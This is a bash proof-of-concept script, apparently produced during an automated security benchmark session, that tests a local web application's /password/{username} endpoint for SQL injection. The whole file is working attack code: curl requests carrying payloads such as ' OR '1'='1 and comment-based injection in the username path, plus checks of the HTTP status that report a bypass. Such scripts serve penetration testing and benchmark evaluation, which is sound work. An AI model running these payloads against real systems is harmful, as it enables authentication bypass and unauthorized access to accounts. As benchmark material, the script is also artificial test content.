#!/bin/bash
# POC: Demonstrates SQL injection in username parameter that bypasses authentication checks on /password endpoint
# Target: ./repo
# Created: 2025-11-04T17:35:50.150Z
# Session: benchmark-XBEN-027-24-mhku5fyk

# SQL Injection Authentication Bypass POC
# Targets: POST /password/{username} endpoint
# Vulnerability: Unsanitized username parameter in SQL query

TARGET_URL="${1:-http://localhost:8080}"
ENDPOINT="/password"

echo "[*] SQL Injection Authentication Bypass POC"
echo "[*] Target: $TARGET_URL$ENDPOINT"
echo ""

# Test 1: Normal login to establish baseline
echo "[TEST 1] Normal login with valid credentials (baseline)"
echo "Payload: username=test, password=test"
RESPONSE=$(curl -s -X POST "$TARGET_URL$ENDPOINT/test" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "password=test" \
  -w "\n%{http_code}" \
  -L)

HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "HTTP Response: $HTTP_CODE"
echo "Response contains redirect or success: $(echo "$BODY" | grep -q 'dashboard\|logout\|user' && echo 'YES' || echo 'NO')"
echo ""

# Test 2: SQL Injection - OR 1=1 bypass
echo "[TEST 2] SQL Injection with OR 1=1 clause (authentication bypass)"
echo "Payload: username=' OR '1'='1, password=test"
RESPONSE=$(curl -s -X POST "$TARGET_URL$ENDPOINT/' OR '1'='1" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "password=test" \
  -w "\n%{http_code}" \
  -L)

HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "HTTP Response: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ] || [ "$HTTP_CODE" = "302" ]; then
  echo "[+] VULNERABLE: SQL injection payload accepted!"
  echo "Response indicates potential bypass: YES"
else
  echo "[-] No obvious bypass detected"
fi
echo ""

# Test 3: SQL Injection with invalid username
echo "[TEST 3] SQL Injection with non-existent username"
echo "Payload: username=invaliduser' OR '1'='1, password=test"
RESPONSE=$(curl -s -X POST "$TARGET_URL$ENDPOINT/invaliduser' OR '1'='1" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "password=test" \
  -w "\n%{http_code}" \
  -L)

HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "HTTP Response: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ] || [ "$HTTP_CODE" = "302" ]; then
  echo "[+] VULNERABLE: Invalid username with SQL injection succeeded!"
else
  echo "[-] Invalid username rejected (expected behavior if properly secured)"
fi
echo ""

# Test 4: SQL Injection with incorrect password to verify parameter separation
echo "[TEST 4] SQL Injection with wrong password (to verify password parameter is still checked)"
echo "Payload: username=' OR '1'='1, password=wrongpassword"
RESPONSE=$(curl -s -X POST "$TARGET_URL$ENDPOINT/' OR '1'='1" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "password=wrongpassword" \
  -w "\n%{http_code}" \
  -L)

HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "HTTP Response: $HTTP_CODE"
if echo "$BODY" | grep -qi "incorrect\|wrong\|invalid"; then
  echo "[+] CONFIRMED: Password parameter is still validated separately"
  echo "This confirms SQL injection affects WHERE clause logic, not complete query bypass"
fi
echo ""

# Test 5: Comment-based SQL injection
echo "[TEST 5] SQL Injection with comment bypass (alternative technique)"
echo "Payload: username=test' --, password=anything"
RESPONSE=$(curl -s -X POST "$TARGET_URL$ENDPOINT/test' --" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "password=anything" \
  -w "\n%{http_code}" \
  -L)

HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "HTTP Response: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ] || [ "$HTTP_CODE" = "302" ]; then
  echo "[+] VULNERABLE: Comment-based injection accepted!"
fi
echo ""

echo "[*] POC Complete"
echo "[*] Interpretation:"
echo "    - If /password endpoint accepts OR '1'='1 or comment payloads with HTTP 200/302"
echo "    - AND invalid usernames also succeed with these payloads"
echo "    - THEN SQL injection authentication bypass is confirmed"